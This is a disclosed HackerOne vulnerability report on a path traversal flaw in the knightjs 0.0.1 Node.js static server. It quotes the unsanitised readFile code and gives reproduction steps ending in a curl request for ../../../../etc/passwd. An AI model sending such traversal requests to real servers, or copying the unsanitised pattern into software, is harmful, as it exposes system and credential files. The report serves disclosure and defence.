# [knightjs] Path Traversal allows to read content of arbitrary files

## Report Details
- **Report ID**: 403707
- **URL**: https://hackerone.com/reports/403707
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-09-01T03:44:25.065Z
- **Disclosed**: 2018-11-02T10:20:46.006Z

## Reporter
- **Username**: abdilahrf_
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report Path Travelsal in Knightjs
It allows attacker to read content of arbitary file on remote server.

# Module

**module name:** Knightjs
**version:** 0.0.1
**npm page:** `https://www.npmjs.com/package/knightjs`

## Module Description

knight is a simple static server without configuration on the top of Node.js.

## Module Stats

~ 10-20 / month

# Vulnerability

## Vulnerability Description

There is no sanitation to the path provided from requests

```
            fs.readFile(pathname, (err, data) => {
                if (err) {
                    res.statusCode = 500
                    res.end(`Error getting the file: ${err}.`)
                } else {
                    res.statusCode = 200
                    // based on the URL path, extract the file extention. e.g. .js, .doc, ...
                    const ext = path.parse(pathname).ext
                    // if the file is found, set Content-type and send data
                    res.setHeader('Content-type', mime[ext] || 'text/plain')
                    res.end(data)
                }
            })
```

and if the file exist they will print the data

## Steps To Reproduce:

- `npm i knightjs`
- `node node_modules/knightjs/bin/knight`
- `curl --path-as-is http://localhost:4000/../../../../../../etc/passwd -v`

F340872


# Wrap up
- I contacted the maintainer to let them know: N]
- I opened an issue in the related repository: N

## Impact

It allows attacker to read content of arbitary file on remote server.

## Attachments
- knightjs-path-traversal.PNG
